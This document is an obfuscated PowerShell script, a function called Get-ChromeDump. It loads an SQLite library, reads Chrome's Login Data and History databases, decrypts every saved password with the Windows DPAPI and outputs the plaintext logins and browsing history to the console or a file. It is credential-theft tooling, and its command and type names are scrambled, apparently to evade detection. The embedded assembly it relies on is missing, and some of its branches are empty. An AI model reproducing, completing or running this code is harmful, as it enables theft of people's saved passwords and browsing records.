 &("{1}{0}" -f 'T','Se') ('XbF'+'g'+'uD') (  [TYpE]("{8}{5}{9}{1}{7}{0}{3}{6}{4}{2}"-f 'R','Uri','tY','Inc','dENTi','Em.','Ipal.WInDowsi','ty.P','SYST','SEc')  ) ;  ${lJ`RI} =[TYpE]("{1}{0}"-f'tr','INtp') ; &("{1}{0}{2}" -f 'I','seT-','tem') ("{4}{0}{3}{2}{1}"-f 'iable','h','dJc',':','vAR')  ( [TyPe]("{2}{3}{4}{0}{1}" -F 'R','t','SYsTe','M','.cOnVe') ) ;  &("{1}{0}{2}"-f '-ItE','SEt','M')  ('vARIA'+'BLE:X'+'4'+'r1')  ([tYpE]("{2}{0}{1}" -f 'O.f','ile','SySTEm.I')  );  &("{0}{1}{2}" -f 'se','T-iT','eM')  ('VarI'+'abLE:yi'+'SL'+'a') ( [TyPe]("{3}{0}{1}{2}" -f'RON','m','ENt','ENVI') )  ;  ${1`RLYT}  =  [tyPe]("{3}{4}{0}{2}{1}{5}"-F 'Tec','DA','Ted','SECurity','.crYptoGrAPhY.pRo','ta')  ;    &("{2}{1}{0}" -f'Ble','RIa','sET-vA') ('Vo'+'zd')  ( [TyPe]("{2}{5}{1}{9}{8}{6}{7}{3}{0}{4}"-F'CoP','PTogRAph','SECUr','S','e','ity.cry','TAPRo','TEcTIon','Da','Y.')  ) ;   &('SV')  ("3S"+"uOI")  ( [tYPE]("{2}{1}{4}{3}{0}{5}"-f 'c','TEm.TE','sYs','T.eN','x','oDing')  )  ; Function G`e`T-ch`Rome`dumP{

  

  [CmdletBinding()]
  param(
    [Parameter(manDAtory = ${fAL`SE})]
    [string]${O`UtFi`LE}
  )
    

    &("{0}{1}{2}" -f 'Add','-','Type') -Assembly ("{2}{0}{1}{3}"-f'tem.','Se','Sys','curity')

    
    if(( ( &("{2}{1}{0}" -f 'e','abL','VaRi')  ('XBf'+'g'+'Ud')  -VaLUeON )::("{2}{1}{0}{3}" -f 're','etCur','G','nt').Invoke())."iSS`Ys`TEm"){
      &("{1}{0}{2}"-f'te','Wri','-Warning') ("{12}{13}{2}{0}{8}{6}{4}{10}{9}{1}{3}{7}{5}{11}" -f'swords cont',' fi','ecrypt pas','le a',' i','STE','d','s SY','aine','a','n Login Dat','M.','Unable to ','d')
      ${N`oPASsw`or`Ds} = ${tr`Ue}
    }

    if(  ${lJ`RI}::"S`Ize" -eq 8)
    {
        
    }
    else
    {
        
    
    }
    
    
    
    &("{0}{3}{2}{1}" -f 'Write','ose','Verb','-') ("{1}{2}{4}{3}{6}{7}{0}{5}"-f'itten','[+]System.Data.SQ','Lite','dll will ','.',' to disk','be',' wr')
    
   
    ${C`o`NTenT} =  (  &("{2}{3}{1}{0}" -f'E','l','gEt-v','aRiAb')  ("{1}{0}"-f'CH','dj') )."VA`LuE"::("{2}{3}{0}{1}"-f'rin','g','FromBase','64St').Invoke(${As`s`EMbly}) 
    
    
    
    ${aSs`e`Mbly`P`ATH} = "$($env:LOCALAPPDATA)\System.Data.SQLite.dll" 
    
    
    if(&("{1}{0}"-f 'ath','Test-p') ${a`sSEMB`LyP`A`Th})
    {
      try 
      {
        &("{2}{0}{1}" -f 'd-T','ype','Ad') -Path ${a`SsE`m`BL`YpAtH}
      }
      catch 
      {
        &("{2}{1}{0}"-f'g','nin','Write-War') ("{9}{4}{5}{2}{7}{6}{8}{1}{3}{0}"-f'y','e asse','a','mbl','!]','Un','o load S','ble t','QLit','[')
        break
      }
    }
    else
    {
          ${X4`R1}::("{3}{0}{1}{2}{4}"-f'ri','teAllBy','t','W','es').Invoke(${A`sseMBly`pAtH},${c`ONTENT})
        &("{4}{2}{0}{1}{3}"-f 'Ver','bos','ite-','e','Wr') ('[+]'+'Ass'+'embl'+'y '+'fo'+'r '+'SQ'+'Li'+'te '+'writt'+'en '+'t'+'o '+"$assemblyPath")
        try 
        {
            &("{0}{1}"-f 'Add','-Type') -Path ${A`sseMBL`yPATh}
        }
        catch 
        {
            &("{1}{0}{2}"-f 'nin','Write-War','g') ("{4}{2}{1}{0}{3}{5}" -f' ','ite','d SQL','ass','[!]Unable to loa','embly')
            break
        }
    }

    

    if(&("{1}{0}{2}{3}"-f 't','Ge','-Proces','s') | &("{2}{1}{0}"-f'bject','O','Where-') {${_}."Na`mE" -like ("{1}{0}"-f'rome*','*ch')}){
      &("{1}{0}{3}{2}"-f'r','W','ing','ite-Warn') ("{3}{8}{6}{5}{2}{4}{1}{7}{0}" -f 'g','ome is ru','h','[!]Cannot p','r',' while c',' Data files','nnin','arse')
      break
    }

    
    ${OS} =  (&("{2}{1}{0}" -f 'm','LDIte','chI') ('varI'+'aBLE:YI'+'sL'+'A'))."V`ALUE"::"O`SVEr`SiOn"."ve`RSiON"
    if(${os}."m`AjoR" -ge 6){
      ${CH`RO`m`EPath} = "$($env:LOCALAPPDATA)\Google\Chrome\User Data\Default "
    }
    else{
      ${CHRomE`p`ATh} = "$($env:HOMEDRIVE)\$($env:HOMEPATH)\Local Settings\Application Data\Google\Chrome\User Data\Default "
    }
    
    if(!(&("{0}{2}{1}" -f'T','h','est-pat') ${C`h`ROME`PAth})){
      Throw ("{4}{7}{1}{0}{5}{3}{6}{2}{8}" -f ' user ','me','s not e',' d','Chr','data directory','oe','o','xist')
    }
    else{
      
      if(&("{1}{0}{2}"-f't-Pa','Tes','th') -Path ("$chromepath\Web "+'Dat'+'a')){${WEB`d`AtADB} = ("$chromepath\Web "+'Da'+'ta')}
      
      if(&("{0}{1}{2}"-f'Test','-Pa','th') -Path ("$chromepath\Login "+'Dat'+'a')){${l`ogiNd`A`TAdb} = ("$chromepath\Login "+'Da'+'ta')}
      
      if(&("{0}{1}{2}"-f 'Te','st-','Path') -Path "$chromepath\History"){${H`iStOry`DB} = "$chromepath\History"}
      

    }

    if(!(${nOp`AS`SWO`RdS})){ 

      
      ${C`oNnStR} = ('D'+'ata '+"Source=$loginDatadb; "+'Ver'+'s'+'ion=3;')

      ${cONNec`Ti`ON} = &("{2}{1}{0}"-f 'ect','w-Obj','Ne') ("{3}{5}{7}{8}{1}{4}{6}{2}{0}"-f 'nection','it','on','Sys','e','t','C','em.Data.S','QLite.SQL')(${C`on`NSTr})

      ${op`ENCON`NEcT`Ion} = ${conNE`C`TiON}.("{2}{1}{3}{0}"-f 'eturn','enA','Op','ndR').Invoke()

      &("{3}{2}{0}{1}" -f 'V','erbose','-','Write') ('O'+'pened '+'DB'+' '+'file'+' '+"$loginDatadb")

      ${qUE`Ry} = ("{1}{3}{4}{0}{2}"-f'OM lo','SELEC','gins;','T * F','R')

      ${data`s`et} = &("{1}{0}{3}{2}"-f'-O','New','ct','bje') ("{3}{1}{2}{4}{0}"-f 'ataSet','yste','m.D','S','ata.D')

      ${DaTAad`ApT`ER} = &("{1}{2}{0}" -f 'Object','N','ew-') ("{9}{1}{10}{8}{6}{5}{0}{4}{3}{2}{7}"-f 'QLiteD','e','t','dap','ataA','.S','SQLite','er','.Data.','Syst','m')(${Q`Ue`RY},${O`PenCOnN`ECt`IoN})

      [void]${dAt`AAd`A`pTer}.("{1}{0}" -f 'ill','f').Invoke(${d`ATA`SET})

      ${lo`Gi`Ns} = @()

      
      ${SCHEmE`_`EnUM} = @{0 = ("{0}{1}"-f 'HT','ML');1 = ("{1}{0}"-f'IC','BAS');2 = ("{0}{1}" -f 'DIGE','ST'); 3 = ("{0}{1}" -f 'O','THER')}

      &("{1}{0}{2}" -f 'ri','W','te-Verbose') ('Pa'+'rsing'+' '+'r'+'es'+'ults '+'of'+' '+'qu'+'e'+'ry '+"$query")

      ${Dat`AsET}."T`ABLES" | &("{4}{1}{0}{2}{3}"-f'c','e','t-Objec','t','Sel') -ExpandProperty ("{0}{1}"-f'Row','s') | &("{1}{3}{2}{0}"-f 'ect','ForE','bj','ach-O') {
        ${enCR`YPT`e`dbYteS} = ${_}."PAsS`w`ord_valUE"
        ${uSE`R`NaMe} = ${_}."usErN`Am`e_va`l`UE"
        ${ACT`io`N_uRl} = ${_}."a`ctiON`_UrL"
        ${OrigI`N`_`URL} = ${_}."ORiGIn`_u`RL"
        ${S`CheME} = ${SCHeM`E_`e`NuM}[[int]${_}."s`ChEme"]
        ${de`C`RYp`TEDb`YTes} =   ${1R`Lyt}::("{1}{2}{0}" -f 'rotect','Un','p').Invoke(${EN`CR`y`PTeDbYTes}, ${NU`ll},   ${v`oZD}::"CuRrent`U`s`er")
        ${pLaIn`Te`xT} =   (  &("{0}{1}" -f'iT','Em') ("v"+"ARiABLe"+":"+"3SUoI"))."vA`lUe"::"a`scii"."G`EtsTRI`Ng"(${d`ECr`Ypte`DBy`TES})
        ${L`OgiN} = &("{1}{2}{3}{0}" -f'ct','New-','Obj','e') ("{0}{1}" -f'PSObj','ect') -Property @{
          ("{2}{1}{0}"-f 'RL','IN_U','ORIG') = ${o`Rig`In_u`RL}
          ("{2}{1}{0}" -f 'ON_URL','CTI','A') = ${A`CTioN_`URl}
          ("{0}{1}" -f 'P','WD') = ${P`LaIn`TeXt}
          ("{0}{1}" -f 'USE','R') = ${use`RNa`ME}
          ("{2}{0}{1}"-f 'H','EME','SC') = ${sC`heme}
        }

        ${logI`Ns} += ${l`ogIn}
      }
    }

    
    ${c`ON`NsT`RIng} = ('Dat'+'a '+"Source=$historydb; "+'V'+'e'+'rsion=3;')

    ${C`o`NnEct`IoN} = &("{1}{0}{2}" -f'ew-Obj','N','ect') ("{1}{5}{4}{3}{7}{2}{0}{6}" -f'nne','Sy','iteCo','ite','m.Data.SQL','ste','ction','.SQL')(${cO`NN`St`RIng})

    ${O`PeN} = ${cOn`Necti`On}.("{1}{0}{2}" -f 'An','Open','dReturn').Invoke()

    &("{0}{2}{3}{1}" -f'Wr','e','i','te-Verbos') ('Ope'+'ne'+'d '+'D'+'B '+'file'+' '+"$historydb")

    ${DAt`As`Et} = &("{3}{0}{1}{2}"-f'bj','ec','t','New-O') ("{3}{4}{1}{5}{0}{2}" -f'a.Dat','m.D','aSet','S','yste','at')

    ${Q`Ue`Ry} = ("{3}{2}{0}{1}{4}" -f '* FR','OM u',' ','SELECT','rls;')

    ${Dat`A`ADAp`TEr} = &("{3}{2}{0}{1}" -f 'e','ct','-Obj','New') ("{2}{4}{5}{3}{6}{0}{1}" -f 'ap','ter','System.Data','Lite','.SQLite.','SQ','DataAd')(${qU`eRY},${o`PEn})

    [void]${DAtaA`d`ApTER}.("{1}{0}" -f 'l','fil').Invoke(${D`A`TaSEt})

    ${hi`STORy} = @()
    ${dat`AseT}."t`AB`lES" | &("{3}{2}{1}{0}" -f't-Object','c','ele','S') -ExpandProperty ("{0}{1}" -f'Row','s') | &("{2}{1}{0}"-f'ct','ch-Obje','ForEa') {
      ${HisT`oRy`INfo} = &("{1}{2}{0}" -f 't','Ne','w-Objec') ("{1}{0}"-f'Object','PS') -Property @{
        ("{1}{0}"-f'itle','T') = ${_}."T`ITLe" 
        ("{1}{0}"-f 'RL','U') = ${_}."U`RL"
      }
      ${Hi`stO`Ry} += ${HiStO`RY`iNFo}
    }
    
    if(!(${o`Utf`Ile})){
      ('['+'*]'+'CHROME '+"PASSWORDS`n")
      ${l`o`gINs} | &("{1}{2}{0}" -f'ist','For','mat-L') ("{1}{2}{0}" -f 'URL','ORIGI','N_'), ("{0}{1}{2}"-f'ACT','ION_','URL'), ("{0}{1}" -f 'P','WD'), ("{0}{1}"-f'USE','R'), ("{1}{0}"-f 'EME','SCH') | &("{0}{3}{1}{2}" -f 'Out-Str','n','g','i')

      ('['+'*]CHRO'+'M'+'E '+"HISTORY`n")

      ${His`TO`Ry} | &("{0}{2}{3}{1}" -f'Format','t','-','Lis') ("{0}{1}"-f'Tit','le'),("{1}{0}"-f'L','UR') | &("{1}{2}{0}" -f 'ing','Ou','t-Str')
    }
    else {
        "[*]LOGINS`n" | &("{2}{0}{1}" -f 'i','le','Out-F') ${OutF`ile} 
        ${l`oGInS} | &("{0}{2}{1}" -f 'Ou','File','t-') ${OutF`ILE} -Append

        "[*]HISTORY`n" | &("{0}{1}{2}" -f 'Out-','Fil','e') ${oUtF`ilE} -Append
        ${H`I`StORy} | &("{0}{2}{1}"-f'O','-File','ut') ${o`U`TFiLE} -Append  

    }

    
    &("{1}{2}{0}{3}" -f '-W','Wr','ite','arning') ('[!]'+' '+'Pl'+'e'+'ase '+'re'+'move '+'SQL'+'ite'+' '+'asse'+'m'+'bly '+'fr'+'om '+'her'+'e: '+"$assemblyPath")

    
    
}